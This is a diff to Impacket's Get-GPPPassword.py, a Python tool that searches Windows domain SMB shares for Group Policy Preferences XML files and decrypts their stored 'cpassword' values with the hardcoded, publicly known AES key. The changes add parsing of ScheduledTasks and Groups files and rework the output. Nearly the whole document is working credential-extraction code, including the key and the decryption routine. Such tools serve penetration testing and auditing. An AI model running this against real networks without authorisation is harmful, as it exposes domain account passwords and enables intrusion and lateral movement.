@@ -10,6 +10,7 @@
 # Description:
 #   Python script for extracting and decrypting Group Policy Preferences passwords,
 #   using Impacket's lib, and using streams for carving files instead of mounting shares
+#   https://podalirius.net/en/articles/exploiting-windows-group-policy-preferences/
 #
 # Authors:
 #   Remi Gascou (@podalirius_)
@@ -18,6 +19,8 @@
 
 import argparse
 import base64
+import xml
+
 import chardet
 import logging
 import os
@@ -87,19 +90,60 @@ class GetGPPasswords(object):
         results = []
         try:
             root = minidom.parseString(filecontent)
-            properties_list = root.getElementsByTagName("Properties")
+            xmltype = root.childNodes[0].tagName
             # function to get attribute if it exists, returns "" if empty
-            read_or_empty = lambda element, attribute: (
-                element.getAttribute(attribute) if element.getAttribute(attribute) != None else "")
-            for properties in properties_list:
-                results.append({
-                    'newname': read_or_empty(properties, 'newName'),
-                    'changed': read_or_empty(properties.parentNode, 'changed'),
-                    'cpassword': read_or_empty(properties, 'cpassword'),
-                    'password': self.decrypt_password(read_or_empty(properties, 'cpassword')),
-                    'username': read_or_empty(properties, 'userName'),
-                    'file': filename
-                })
+            read_or_empty = lambda element, attribute: (element.getAttribute(attribute) if element.getAttribute(attribute) is not None else "")
+
+            # ScheduledTasks
+            if xmltype == "ScheduledTasks":
+                for topnode in root.childNodes:
+                    task_nodes = [c for c in topnode.childNodes if isinstance(c, xml.dom.minidom.Element)]
+                    for task in task_nodes:
+                        for property in task.getElementsByTagName("Properties"):
+                            results.append({
+                                'tagName': xmltype,
+                                'attributes': [
+                                    ('runAs', read_or_empty(property, 'runAs')),
+                                    ('name', read_or_empty(task, 'name')),
+                                    ('changed', read_or_empty(property.parentNode, 'changed')),
+                                    ('cpassword', read_or_empty(property, 'cpassword')),
+                                    ('password', self.decrypt_password(read_or_empty(property, 'cpassword'))),
+                                ],
+                                'file': filename
+                            })
+            elif xmltype == "Groups":
+                for topnode in root.childNodes:
+                    task_nodes = [c for c in topnode.childNodes if isinstance(c, xml.dom.minidom.Element)]
+                    for task in task_nodes:
+                        for property in task.getElementsByTagName("Properties"):
+                            results.append({
+                                'tagName': xmltype,
+                                'attributes': [
+                                    ('newName', read_or_empty(property, 'newName')),
+                                    ('userName', read_or_empty(property, 'userName')),
+                                    ('cpassword', read_or_empty(property, 'cpassword')),
+                                    ('password', self.decrypt_password(read_or_empty(property, 'cpassword'))),
+                                    ('changed', read_or_empty(property.parentNode, 'changed')),
+                                ],
+                                'file': filename
+                            })
+            else:
+                for topnode in root.childNodes:
+                    task_nodes = [c for c in topnode.childNodes if isinstance(c, xml.dom.minidom.Element)]
+                    for task in task_nodes:
+                        for property in task.getElementsByTagName("Properties"):
+                            results.append({
+                                'tagName': xmltype,
+                                'attributes': [
+                                    ('newName', read_or_empty(property, 'newName')),
+                                    ('userName', read_or_empty(property, 'userName')),
+                                    ('cpassword', read_or_empty(property, 'cpassword')),
+                                    ('password', self.decrypt_password(read_or_empty(property, 'cpassword'))),
+                                    ('changed', read_or_empty(property.parentNode, 'changed')),
+                                ],
+                                'file': filename
+                            })
+
         except Exception as e:
             if logging.getLogger().level == logging.DEBUG:
                 traceback.print_exc()
@@ -121,7 +165,7 @@ class GetGPPasswords(object):
             raise
         output = fh.getvalue()
         encoding = chardet.detect(output)["encoding"]
-        if encoding != None:
+        if encoding is not None:
             filecontent = output.decode(encoding).rstrip()
             if 'cpassword' in filecontent:
                 logging.debug(filecontent)
@@ -136,10 +180,10 @@ class GetGPPasswords(object):
 
     def decrypt_password(self, pw_enc_b64):
         if len(pw_enc_b64) != 0:
-            # thank you MS for publishing the key :) (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)
-            key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20' \
-                  b'\x9b\x09\xa4\x33\xb6\x6c\x1b'
-            # thank you MS for using a fixed IV :)
+            # Thank you Microsoft for publishing the key :)
+            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be
+            key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
+            # Thank you Microsoft for using a fixed IV :)
             iv = b'\x00' * 16
             pad = len(pw_enc_b64) % 4
             if pad == 1:
@@ -156,11 +200,12 @@ class GetGPPasswords(object):
 
     def show(self, results):
         for result in results:
-            logging.info("NewName\t: %s" % result['newname'])
-            logging.info("Changed\t: %s" % result['changed'])
-            logging.info("Username\t: %s" % result['username'])
-            logging.info("Password\t: %s" % result['password'])
-            logging.info("File\t: %s \n" % result['file'])
+            logging.info("Found a %s XML file:" % result['tagName'])
+            logging.info("  %-10s: %s" % ("file", result['file']))
+            for attr, value in result['attributes']:
+                if attr != "cpassword":
+                    logging.info("  %-10s: %s" % (attr, value))
+            print()
 
 
 def parse_args():
@@ -266,13 +311,13 @@ def main():
     print(version.BANNER)
     args = parse_args()
     init_logger(args)
-    if args.target.upper() == "LOCAL" :
+    if args.target.upper() == "LOCAL":
         if args.xmlfile is not None:
             # Only given decrypt XML file
             if os.path.exists(args.xmlfile):
                 g = GetGPPasswords(None, None)
                 logging.debug("Opening %s XML file for reading ..." % args.xmlfile)
-                f = open(args.xmlfile,'r')
+                f = open(args.xmlfile, 'r')
                 rawdata = ''.join(f.readlines())
                 f.close()
                 results = g.parse_xmlfile_content(args.xmlfile, rawdata)
@@ -282,7 +327,7 @@ def main():
     else:
         domain, username, password, address, lmhash, nthash = parse_target(args)
         try:
-            smbClient= init_smb_session(args, domain, username, password, address, lmhash, nthash)
+            smbClient = init_smb_session(args, domain, username, password, address, lmhash, nthash)
             g = GetGPPasswords(smbClient, args.share)
             g.list_shares()
             g.find_cpasswords(args.base_dir)
